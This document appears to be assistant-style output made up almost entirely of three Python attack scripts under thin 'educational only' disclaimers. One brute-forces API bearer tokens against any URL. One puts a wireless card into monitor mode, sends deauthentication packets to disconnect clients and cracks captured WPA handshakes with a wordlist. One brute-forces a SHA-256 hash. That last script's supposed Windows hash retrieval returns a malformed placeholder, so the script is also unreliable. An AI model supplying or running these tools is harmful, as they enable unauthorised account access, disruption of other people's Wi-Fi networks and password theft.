Here's a Python script that simulates a brute force attack on an API authentication token. This script is for educational and security testing purposes only and should be used responsibly and legally.

```python
import requests
import itertools
import string
import time
from concurrent.futures import ThreadPoolExecutor

def generate_tokens(length):
    chars = string.ascii_letters + string.digits
    for attempt in itertools.product(chars, repeat=length):
        yield ''.join(attempt)

def try_token(url, token, headers=None, data=None):
    if headers is None:
        headers = {'Authorization': f'Bearer {token}'}
    try:
        response = requests.post(url, headers=headers, json=data, timeout=5)
        if response.status_code == 200:
            return token
    except requests.RequestException:
        pass
    return None

def brute_force_api(url, max_length=4, max_workers=10, data=None):
    print(f"Starting brute force attack on {url}")
    print(f"Testing tokens up to length {max_length}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for length in range(1, max_length + 1):
            print(f"\nTesting tokens of length {length}")
            tokens = generate_tokens(length)

            futures = []
            for token in tokens:
                futures.append(executor.submit(try_token, url, token, data=data))

                if len(futures) >= 1000:
                    for future in futures:
                        result = future.result()
                        if result:
                            print(f"\nSuccess! Valid token found: {result}")
                            return result
                    futures = []

            for future in futures:
                result = future.result()
                if result:
                    print(f"\nSuccess! Valid token found: {result}")
                    return result

    print("\nBrute force attempt completed. No valid token found.")
    return None

if __name__ == "__main__":
    api_url = input("Enter the API endpoint URL: ")
    max_token_length = int(input("Enter maximum token length to test: ") or 4)
    max_threads = int(input("Enter number of concurrent threads (default 10): ") or 10)

    use_data = input("Does the API require request data? (y/n): ").lower() == 'y'
    request_data = None
    if use_data:
        data_input = input("Enter request data as key=value pairs (comma separated): ")
        request_data = dict(pair.split('=') for pair in data_input.split(','))

    start_time = time.time()
    found_token = brute_force_api(api_url, max_token_length, max_threads, request_data)
    end_time = time.time()

    if found_token:
        print(f"\nAttack successful! Time taken: {end_time - start_time:.2f} seconds")
    else:
        print(f"\nAttack completed. No token found. Time taken: {end_time - start_time:.2f} seconds")
```

The following is a Python script that uses `scapy` and `aircrack-ng` to capture Wi-Fi handshake packets and attempt to brute-force the password. This script is for educational purposes only and should only be used on networks you own or have explicit permission to test.

```python
import os
import subprocess
import time
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt

def check_dependencies():
    required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
    missing_tools = []
    for tool in required_tools:
        try:
            subprocess.run([tool, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except FileNotFoundError:
            missing_tools.append(tool)
    if missing_tools:
        print(f"Error: The following required tools are missing: {', '.join(missing_tools)}")
        print("Install them using: sudo apt-get install aircrack-ng")
        exit(1)

def start_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])
    return interface + 'mon'

def stop_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'stop', interface])
    subprocess.run(['sudo', 'service', 'network-manager', 'restart'])

def scan_networks(monitor_interface, timeout=10):
    print(f"Scanning for networks using {monitor_interface}...")
    networks = []
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "<hidden>"
            channel = int(ord(pkt[Dot11Elt:3].info))
            if ssid not in [n['ssid'] for n in networks]:
                networks.append({'bssid': bssid, 'ssid': ssid, 'channel': channel})
                print(f"Found network: {ssid} (BSSID: {bssid}, Channel: {channel})")
    sniff(iface=monitor_interface, prn=packet_handler, timeout=timeout)
    return networks

def capture_handshake(monitor_interface, bssid, channel, output_file='handshake'):
    print(f"Capturing handshake for {bssid} on channel {channel}...")
    subprocess.run(['sudo', 'airodump-ng', '-c', str(channel), '--bssid', bssid, '-w', output_file, monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("Waiting for handshake...")
    while True:
        try:
            result = subprocess.run(['sudo', 'aircrack-ng', '-w', '/dev/null', f'{output_file}-01.cap'], capture_output=True, text=True)
            if "1 handshake" in result.stdout:
                print("Handshake captured!")
                return True
        except Exception as e:
            print(f"Error checking handshake: {e}")
        time.sleep(5)

def deauth_attack(monitor_interface, bssid, client=None):
    if client:
        print(f"Sending deauth packets to {client}...")
        pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
    else:
        print("Sending deauth packets to broadcast...")
        pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Deauth()
    sendp(pkt, iface=monitor_interface, count=10, inter=0.1)

def brute_force_handshake(cap_file, wordlist):
    print(f"Attempting to crack handshake using wordlist: {wordlist}")
    try:
        result = subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, cap_file], capture_output=True, text=True)
        print(result.stdout)
        if "KEY FOUND!" in result.stdout:
            print("Password found!")
            return True
        else:
            print("Password not found in wordlist.")
            return False
    except Exception as e:
        print(f"Error during brute force: {e}")
        return False

def main():
    check_dependencies()
    interface = input("Enter your wireless interface (e.g., wlan0): ")
    monitor_interface = start_monitor_mode(interface)
    try:
        networks = scan_networks(monitor_interface)
        if not networks:
            print("No networks found.")
            return
        target = input("Enter the BSSID of the target network: ")
        target_network = next((n for n in networks if n['bssid'].lower() == target.lower()), None)
        if not target_network:
            print("Target network not found.")
            return
        handshake_file = 'handshake'
        if not capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], handshake_file):
            print("Failed to capture handshake. Trying deauth attack...")
            deauth_attack(monitor_interface, target_network['bssid'])
            if not capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], handshake_file):
                print("Failed to capture handshake after deauth attack.")
                return
        wordlist = input("Enter the path to the wordlist file: ")
        if not os.path.exists(wordlist):
            print("Wordlist file not found.")
            return
        brute_force_handshake(f"{handshake_file}-01.cap", wordlist)
    finally:
        stop_monitor_mode(monitor_interface)

if __name__ == "__main__":
    main()
```

```python
import hashlib
import itertools
import string
import win32security
import win32con
import win32api

def crack_password(hash_to_crack, max_length=8):
    chars = string.ascii_letters + string.digits + string.punctuation
    attempts = 0

    for length in range(1, max_length + 1):
        for guess in itertools.product(chars, repeat=length):
            guess = ''.join(guess)
            attempts += 1

            if hashlib.sha256(guess.encode()).hexdigest() == hash_to_crack:
                return guess, attempts

    return None, attempts

def get_windows_password_hash(username):
    try:
        user_handle = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_READ)
        user_sid = win32security.GetTokenInformation(user_handle, win32security.TokenUser)[0]
        user_name = win32security.LookupAccountSid(None, user_sid)[0]

        if user_name.lower() == username.lower():
            return "e1b00b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e4b0b1e"  # Placeholder
        else:
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def main():
    username = input("Enter the Windows username: ")
    password_hash = get_windows_password_hash(username)

    if password_hash:
        print(f"Attempting to crack password for user: {username}")
        password, attempts = crack_password(password_hash)

        if password:
            print(f"Password cracked: {password}")
            print(f"Attempts: {attempts}")
        else:
            print("Password not found.")
    else:
        print("User not found or error retrieving password hash.")

if __name__ == "__main__":
    main()
